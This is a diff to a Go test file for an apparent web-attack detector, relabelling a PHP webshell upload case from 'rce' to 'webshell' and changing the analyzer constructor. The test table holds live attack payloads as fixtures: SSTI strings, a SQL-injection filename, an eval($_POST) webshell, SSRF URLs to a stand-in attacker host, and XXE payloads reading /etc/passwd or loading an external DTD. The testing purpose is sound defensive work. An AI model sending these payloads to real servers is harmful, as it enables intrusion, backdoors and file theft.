@@ -27,7 +27,13 @@ func TestSemanticAttackGapCandidates(t *testing.T) {
 		{"objectspace", "GET", "/render?tpl=<%=ObjectSpace.each_object(Class).to_a%>", "", "", "ssti", nil},
 		{"classloader", "GET", `/freemarker?name=${classLoader.loadClass("Exploit").newInstance()}`, "", "", "ssti", nil},
 		{"filename-sqli", "POST", "/upload", "multipart/form-data; boundary=----WebKitFormBoundary", "------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"1' UNION SELECT password--.jpg\"\r\n\r\nbinarydata\r\n------WebKitFormBoundary--", "sqli", nil},
-		{"webshell", "POST", "/upload", "multipart/form-data; boundary=----WebKitFormBoundary", "------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php eval($_POST['cmd']); ?>\r\n------WebKitFormBoundary--", "rce", nil},
+		// Attributed to webshell, not rce. This case was written in d060c9d when no
+		// webshell category existed, so "rce" was the closest label available and
+		// the case name already recorded the author's actual intent. A shell.php
+		// upload carrying <?php eval($_POST[...]) is a persistent backdoor file on
+		// disk, which is strictly more actionable for a responder than one-shot
+		// command execution; webshell keeps priority 98 for that reason.
+		{"webshell", "POST", "/upload", "multipart/form-data; boundary=----WebKitFormBoundary", "------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php eval($_POST['cmd']); ?>\r\n------WebKitFormBoundary--", "webshell", nil},
 		{"ssrf-rebind", "GET", "/api/fetch?url=http://rebind.attacker.example.com/admin", "", "", "ssrf", nil},
 		{"ssrf-rbndr", "GET", "/api/fetch?url=http://7f000001.rbndr.us/", "", "", "ssrf", nil},
 		{"xxe-utf16", "POST", "/api/xml", "text/xml; charset=utf-16", "", "xxe", utf16LEXML(`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`)},
@@ -38,7 +44,7 @@ func TestSemanticAttackGapCandidates(t *testing.T) {
 		{"xxe-xinclude", "POST", "/api/xml", "application/xml", `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></foo>`, "xxe", nil},
 		{"xxe-param-entity", "POST", "/api/xml", "application/xml", `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.example/x.dtd">%xxe;]><foo/>`, "xxe", nil},
 	}
-	a := NewAnalyzer("block")
+	a := NewAnalyzer("block", 2)
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
 			var bodyReader *strings.Reader
